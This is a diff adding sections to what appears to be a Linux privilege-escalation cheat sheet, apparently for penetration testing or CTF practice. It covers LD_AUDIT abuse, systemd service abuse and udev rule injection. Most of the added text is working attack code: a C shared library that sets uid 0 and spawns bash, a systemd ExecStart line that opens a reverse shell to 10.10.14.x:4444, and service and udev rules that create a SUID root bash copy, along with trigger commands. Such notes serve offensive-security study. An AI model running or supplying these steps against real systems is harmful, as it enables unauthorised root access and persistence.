@@ -545,6 +545,29 @@ ldd /path/to/binary
 readelf -d /path/to/binary | grep -i rpath
 ```
 
+### LD_AUDIT (LD_PRELOAD Alternative)
+
+`LD_AUDIT` loads a shared library to audit dynamic linker events. Many `sudoers` configs strip `LD_PRELOAD` but forget `LD_AUDIT`. Same code, different variable.
+
+```c
+// audit.c — same technique as LD_PRELOAD but uses la_version() entry point
+#include <stdio.h>
+#include <stdlib.h>
+unsigned int la_version(unsigned int v) {
+    unsetenv("LD_AUDIT");
+    setuid(0); setgid(0);
+    system("/bin/bash");
+    return v;
+}
+```
+
+```bash
+gcc -fPIC -shared -o /tmp/audit.so audit.c
+sudo LD_AUDIT=/tmp/audit.so <allowed_sudo_command>
+```
+
+> [!tip] If sudoers has `env_keep += LD_PRELOAD` missing but `env_reset` isn't stripping all vars, try `LD_AUDIT`. Also worth trying if `LD_PRELOAD` is explicitly listed in `env_delete`.
+
 ### Writable /etc/ld.so.conf.d/
 
 ```bash
@@ -554,6 +577,73 @@ echo "/tmp/libs" >> /etc/ld.so.conf.d/evil.conf
 ldconfig
 # Place malicious .so in /tmp/libs/ with same name as a library the SUID binary uses
 ```
+
+---
+
+## systemd Service Abuse
+
+If you can write to a `.service` file or drop a new one into a writable systemd directory, replace `ExecStart` with a shell command. Reload and restart the service as root.
+
+```bash
+# Find writable service files
+find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system \
+  -name "*.service" -writable 2>/dev/null
+
+# Check if any service timer runs periodically as root
+systemctl list-timers --all
+
+# If you can write to a service file — replace ExecStart
+cat /etc/systemd/system/vulnerable.service
+# Edit ExecStart line:
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1'
+
+# Or create a new service if /etc/systemd/system is writable:
+cat > /etc/systemd/system/evil.service << 'EOF'
+[Unit]
+Description=Evil
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# Reload and start (if you can run systemctl as sudo or service is auto-started)
+sudo systemctl daemon-reload
+sudo systemctl start evil.service
+# Or wait for a timer/reboot if the service is enabled
+```
+
+---
+
+## udev Rule Injection
+
+`udev` runs rules as root when hardware events occur. If `/etc/udev/rules.d/` is writable, inject a rule that executes a command.
+
+```bash
+# Check if rules directory is writable
+ls -la /etc/udev/rules.d/
+
+# Create a rule that runs on any USB/device event:
+cat > /etc/udev/rules.d/99-evil.rules << 'EOF'
+SUBSYSTEM=="net", RUN+="/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'"
+EOF
+
+# Trigger the rule — udev fires on device events
+# Method 1: trigger manually (may require sudo)
+udevadm trigger
+
+# Method 2: wait for a hardware event (network interface up/down, USB plug)
+# Method 3: use ip link to bounce a network interface (if allowed):
+ip link set eth0 down && ip link set eth0 up
+
+# After rule fires:
+/tmp/rootbash -p
+```
+
+> [!note] udev rules fire as root on device events. The `RUN+=` directive executes the command immediately when the matching event occurs. Works even without a persistent connection as long as a device event triggers.
 
 ---
 
@@ -860,5 +950,5 @@ KERNEL
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
